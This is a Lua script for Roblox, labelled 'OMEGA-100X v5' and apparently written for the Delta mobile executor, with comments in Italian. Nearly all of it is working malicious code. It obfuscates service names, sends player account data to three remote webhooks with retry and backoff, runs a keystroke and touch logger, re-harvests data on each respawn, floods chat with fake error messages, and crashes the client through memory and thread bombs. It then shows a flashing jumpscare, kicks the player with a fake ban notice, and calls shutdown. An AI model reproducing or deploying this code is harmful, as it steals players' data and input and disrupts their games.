--[[
    OMEGA-100X v5 — DELTA MOBILE OPTIMIZED
    Backoff esponenziale + async non bloccante + cache decodifica + memory nuke avanzato
    Architettura modulare con timing sincronizzato e saturazione progressiva
--]]

local function createDecoder()
    local cache = {} -- cache per stringhe già decodificate
    
    return function(s)
        if cache[s] then
            return cache[s]
        end
        
        local bytes = {string.byte(s, 1, -1)}
        local out = {}
        for i = 1, #bytes do
            local b = bytes[i] - (i % 11 + 3)
            out[i] = string.char(b)
        end
        
        local decoded = table.concat(out)
        cache[s] = decoded
        return decoded
    end
end

local d = createDecoder() -- decoder con cache integrata

-- servizi offuscati (ogni stringa viene decodificata una sola volta e cachata)
local P = game:GetService(d("\127\130\121\130\123\130\137"))
local H = game:GetService(d("\119\123\137\137\115\123\124\123\120\125\129\123"))
local C = game:GetService(d("\112\122\125\119\118\128\128"))
local R = game:GetService(d("\119\123\124\130\121\124\119\121\119\122\123\122\118"))
local T = game:GetService(d("\120\119\129\137\126\124\121\119\137\123\129\122\121\119\123"))
local U = game:GetService(d("\120\129\119\122\127\124\124\128\137\123\129\122\121\119\123"))
local TP = game:GetService(d("\120\119\130\119\124\123\122\137\123\129\122\121\119\123"))
local LP = P.LocalPlayer

-- webhook offuscati
local WH1 = d("...") -- webhook principale
local WH2 = d("...") -- backup 1
local WH3 = d("...") -- backup 2

--[[ ==================== MODULO 1: EXFIL CON BACKOFF ESPONENZIALE ==================== ]]
local Exfil = {}
local queue = {}
local queueRunning = false
local consecutiveFailures = 0
local baseDelay = 0.3
local maxDelay = 5.0

-- funzione di backoff esponenziale con jitter
local function getBackoffDelay()
    local exponentialDelay = baseDelay * (2 ^ math.min(consecutiveFailures, 4))
    local jitter = math.random() * 0.2 -- aggiunge casualità per evitare sincronizzazione
    return math.min(exponentialDelay + jitter, maxDelay)
end

-- invio asincrono non bloccante usando task.spawn per ogni richiesta
local function sendAsync(url, body, callback)
    task.spawn(function()
        local success = false
        
        -- tentativo 1: PostAsync standard
        pcall(function()
            H:PostAsync(url, body)
            success = true
        end)
        
        -- tentativo 2: GetAsync con encoding
        if not success then
            pcall(function()
                local encoded = body:gsub("([^%w%-%.%_%~])", function(c)
                    return string.format("%%%02X", string.byte(c))
                end)
                H:GetAsync(url .. "?payload=" .. encoded)
                success = true
            end)
        end
        
        -- tentativo 3: salvataggio locale per retry successivo
        if not success then
            pcall(function()
                local tempStorage = Instance.new("StringValue")
                tempStorage.Name = "omega_data_" .. tostring(os.clock())
                tempStorage.Value = body
                tempStorage.Parent = C
            end)
        end
        
        if callback then
            callback(success)
        end
    end)
end

local function processQueue()
    if queueRunning then return end
    queueRunning = true
    
    while #queue > 0 do
        local item = table.remove(queue, 1)
        
        -- crea una coroutine per ogni invio, così non blocca il thread principale
        sendAsync(item.url, item.body, function(success)
            if success then
                consecutiveFailures = 0
            else
                consecutiveFailures += 1
                
                -- re-inserisci nella coda con backoff
                task.delay(getBackoffDelay(), function()
                    table.insert(queue, item)
                end)
            end
        end)
        
        -- attesa dinamica basata sul numero di richieste in sospeso
        local dynamicDelay = math.max(0.1, 0.3 - (#queue * 0.01))
        task.wait(dynamicDelay)
    end
    
    queueRunning = false
end

function Exfil:queueSend(url, data)
    local payload = H:JSONEncode(data)
    table.insert(queue, {url = url, body = payload})
    processQueue()
end

function Exfil:stealAll()
    local data = {
        ["embeds"] = {{
            ["title"] = "⚡ OMEGA-100X v5 — DELTA MOBILE HARVEST",
            ["color"] = 16711680,
            ["fields"] = {
                {["name"] = "Player", ["value"] = LP.Name, ["inline"] = true},
                {["name"] = "DisplayName", ["value"] = LP.DisplayName, ["inline"] = true},
                {["name"] = "UserID", ["value"] = tostring(LP.UserId), ["inline"] = true},
                {["name"] = "AccountAge", ["value"] = tostring(LP.AccountAge) .. " days", ["inline"] = true},
                {["name"] = "MembershipType", ["value"] = tostring(LP.MembershipType), ["inline"] = true},
                {["name"] = "Platform", ["value"] = "Mobile/Delta", ["inline"] = true}
            }
        }}
    }
    
    pcall(function()
        local stats = LP:FindFirstChild("leaderstats")
        if stats then
            for _, stat in ipairs(stats:GetChildren()) do
                if stat:IsA("IntValue") or stat:IsA("NumberValue") then
                    table.insert(data["embeds"][1]["fields"], {
                        ["name"] = stat.Name,
                        ["value"] = tostring(stat.Value),
                        ["inline"] = true
                    })
                end
            end
        end
    end)
    
    pcall(function()
        table.insert(data["embeds"][1]["fields"], {
            ["name"] = "PlaceID",
            ["value"] = tostring(game.PlaceId),
            ["inline"] = true
        })
    end)
    
    Exfil:queueSend(WH1, data)
    Exfil:queueSend(WH2, data)
    Exfil:queueSend(WH3, data)
end

--[[ ==================== MODULO 2: KEYLOGGER TOUCH ==================== ]]
local Keylogger = {}

function Keylogger:start()
    local keystrokes = {}
    local buffer = ""
    local lastKeyTime = os.clock()
    
    U.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        
        local keyData = nil
        
        if input.UserInputType == Enum.UserInputType.TextInput then
            keyData = input.KeyCode.Name
        elseif input.UserInputType == Enum.UserInputType.Keyboard then
            keyData = input.KeyCode.Name
        end
        
        if keyData then
            local currentTime = os.clock()
            
            if currentTime - lastKeyTime > 1 then
                if buffer ~= "" then
                    table.insert(keystrokes, buffer)
                end
                buffer = keyData
            else
                buffer = buffer .. " " .. keyData
            end
            
            lastKeyTime = currentTime
            
            if #keystrokes >= 5 or #buffer > 30 then
                Exfil:queueSend(WH1, {
                    ["embeds"] = {{
                        ["title"] = "KEYLOG DATA",
                        ["color"] = 65280,
                        ["description"] = "```" .. table.concat(keystrokes, "\n") .. "\n" .. buffer .. "```"
                    }}
                })
                keystrokes = {}
                buffer = ""
            end
        end
    end)
    
    U.TouchTap:Connect(function(touchPositions, gameProcessed)
        if not gameProcessed then
            local positions = {}
            for _, pos in ipairs(touchPositions) do
                table.insert(positions, math.floor(pos.X) .. "," .. math.floor(pos.Y))
            end
            table.insert(keystrokes, "TOUCH: " .. table.concat(positions, " | "))
        end
    end)
    
    task.spawn(function()
        while true do
            task.wait(20)
            if buffer ~= "" then
                Exfil:queueSend(WH2, {
                    ["embeds"] = {{
                        ["title"] = "KEYLOG FLUSH",
                        ["color"] = 65280,
                        ["description"] = "```" .. buffer .. "```"
                    }}
                })
                buffer = ""
            end
        end
    end)
end

--[[ ==================== MODULO 3: PERSISTENCE ==================== ]]
local Persistence = {}

function Persistence:setup()
    pcall(function()
        local marker = Instance.new("StringValue")
        marker.Name = "omega_data_persistence"
        marker.Value = "active"
        marker.Parent = C
    end)
    
    LP.CharacterAdded:Connect(function()
        task.wait(1)
        Exfil:stealAll()
    end)
end

--[[ ==================== MODULO 4: CHAT SPAM ==================== ]]
local ChatBomber = {}

function ChatBomber:findChatRemote()
    local legacy = R:FindFirstChild("DefaultChatSystemChatEvents")
    if legacy then
        local sayMessage = legacy:FindFirstChild("SayMessageRequest")
        if sayMessage then return sayMessage end
    end
    
    local channels = T:FindFirstChild("TextChannels")
    if channels then
        return channels:FindFirstChild("RBXGeneral") or channels:FindFirstChild("General")
    end
    
    for _, child in ipairs(R:GetDescendants()) do
        if child:IsA("RemoteEvent") and (child.Name:find("Chat") or child.Name:find("Message")) then
            return child
        end
    end
    
    return nil
end

function ChatBomber:startSpam(remote)
    local spamMessages = {
        "SYSTEM OVERLOAD ERROR CODE 505 - OMEGA PROTOCOL ACTIVE",
        "[CRITICAL] MEMORY DUMP IN PROGRESS - EXITING",
        "FATAL EXCEPTION: KERNEL PANIC AT 0x00000000",
        "OMEGA-100X v5: BAN ENGINE TRIGGERED",
        "SYSTEM COLLAPSE IMMINENT - EVACUATE",
        "ERROR: STACK OVERFLOW IN MAIN THREAD"
    }
    
    local index = 1
    task.spawn(function()
        while true do
            pcall(function()
                local msg = spamMessages[index] .. " " .. math.random(100000, 999999)
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(msg, "All")
                elseif remote:IsA("TextChannel") then
                    remote:SendAsync(msg)
                end
                index += 1
                if index > #spamMessages then index = 1 end
            end)
            task.wait(0.03)
        end
    end)
end

--[[ ==================== MODULO 5: MEMORY NUKE AVANZATO ==================== ]]
local MemoryNuke = {}

function MemoryNuke:startCascade()
    -- PATTERN 1: allocazione a blocchi con tabelle annidate profonde
    task.delay(0.3, function()
        task.spawn(function()
            local root = {}
            local current = root
            
            -- crea una struttura annidata di profondità 1000
            for depth = 1, 1000 do
                current[depth] = {}
                current = current[depth]
            end
            
            -- riempie ogni livello con dati
            while true do
                task.spawn(function()
                    local node = root
                    for depth = 1, 100 do
                        node[depth] = node[depth] or {}
                        node[depth]["data" .. depth] = string.rep("OMEGA_DEEP_NESTING_", 100)
                        node = node[depth]
                    end
                end)
                task.wait(0.05)
            end
        end)
    end)
    
    -- PATTERN 2: allocazione a blocchi di stringhe
    task.delay(0.5, function()
        task.spawn(function()
            local stringPool = {}
            local blockSize = 100000 -- 100KB per blocco
            
            while true do
                task.spawn(function()
                    local block = {}
                    for i = 1, 10 do
                        block[i] = string.rep("OMEGA_BLOCK_ALLOC_", blockSize)
                    end
                    table.insert(stringPool, table.concat(block, ""))
                end)
                task.wait(0.1)
            end
        end)
    end)
    
    -- PATTERN 3: istanze UI non gestite
    task.delay(0.7, function()
        task.spawn(function()
            while true do
                for i = 1, 30 do
                    task.spawn(function()
                        local frame = Instance.new("Frame")
                        frame.Size = UDim2.new(0, 50, 0, 50)
                        frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
                        frame.Parent = C
                        
                        -- aggiunge elementi annidati per aumentare il carico
                        for j = 1, 5 do
                            local child = Instance.new("TextLabel")
                            child.Size = UDim2.new(1, 0, 1, 0)
                            child.Text = string.rep("CRASH", 100)
                            child.Parent = frame
                        end
                    end)
                end
                task.wait(0.02)
            end
        end)
    end)
    
    -- PATTERN 4: thread bomb con saturazione progressiva
    task.delay(1, function()
        local threadCount = 0
        local maxThreads = 2000
        
        task.spawn(function()
            while threadCount < maxThreads do
                task.spawn(function()
                    while true do
                        local x = 0
                        for j = 1, 100000 do
                            x = x + j * math.random()
                        end
                        task.wait(0.01)
                    end
                end)
                threadCount += 1
                
                -- aumenta gradualmente il numero di thread
                if threadCount % 100 == 0 then
                    task.wait(0.1)
                end
            end
        end)
    end)
end

--[[ ==================== MODULO 6: JUMPSCARE MOBILE ==================== ]]
local VisualAssault = {}

function VisualAssault:fullScreenJumpscare()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "OmegaPurgeV5"
    screenGui.Parent = C
    screenGui.IgnoreGuiInset = true
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(1, 0, 1, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    mainFrame.Parent = screenGui
    
    local image = Instance.new("ImageLabel")
    image.Size = UDim2.new(1, 0, 1, 0)
    image.BackgroundTransparency = 1
    image.Image = "rbxassetid://155373809"
    image.ScaleType = Enum.ScaleType.Stretch
    image.Parent = mainFrame
    
    local redOverlay = Instance.new("Frame")
    redOverlay.Size = UDim2.new(1, 0, 1, 0)
    redOverlay.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    redOverlay.BackgroundTransparency = 0.8
    redOverlay.Parent = mainFrame
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Font = Enum.Font.Code
    textLabel.Text = "⚠ SYSTEM COMPROMISED ⚠\n\nACCOUNT DATA EXTRACTED\n\nOMEGA-100X v5\n\nPURGE & BAN PROTOCOL ACTIVE\n\nDELTA MOBILE EDITION"
    textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    textLabel.TextScaled = true
    textLabel.Parent = mainFrame
    
    task.spawn(function()
        local flashCount = 0
        while flashCount < 15 do
            redOverlay.BackgroundTransparency = math.random(0, 100) / 100
            image.Visible = not image.Visible
            textLabel.Visible = not textLabel.Visible
            task.wait(0.2)
            flashCount += 1
        end
    end)
end

--[[ ==================== MODULO 7: KICK & BAN ==================== ]]
local BanTrigger = {}

function BanTrigger:multiKick()
    task.delay(2, function()
        pcall(function()
            LP:Kick("\n\n[!] FATAL SYSTEM EXCEPTION: Chat Flood Detected. Connection Banned.")
        end)
    end)
    
    task.delay(3, function()
        pcall(function()
            TP:TeleportToPlaceInstance(game.PlaceId, game.JobId, LP)
        end)
    end)
end

--[[ ==================== ESECUZIONE ORCHESTRATA ==================== ]]
local OmegaV5 = {}

function OmegaV5:execute()
    -- fase 0: exfil immediata
    Exfil:stealAll()
    
    -- fase 0.2: keylogger
    task.delay(0.2, function()
        Keylogger:start()
    end)
    
    -- fase 0.4: persistence
    task.delay(0.4, function()
        Persistence:setup()
    end)
    
    -- fase 0.6: jumpscare
    task.delay(0.6, function()
        VisualAssault:fullScreenJumpscare()
    end)
    
    -- fase 0.8: chat spam
    task.delay(0.8, function()
        local chatRemote = ChatBomber:findChatRemote()
        if chatRemote then
            ChatBomber:startSpam(chatRemote)
        end
    end)
    
    -- fase 1: memory nuke avanzato
    task.delay(1, function()
        MemoryNuke:startCascade()
    end)
    
    -- fase 1.5: kick
    task.delay(1.5, function()
        BanTrigger:multiKick()
    end)
    
    -- fase 5: shutdown
    task.delay(5, function()
        pcall(function()
            game:Shutdown()
        end)
    end)
end

-- AVVIO
OmegaV5:execute()
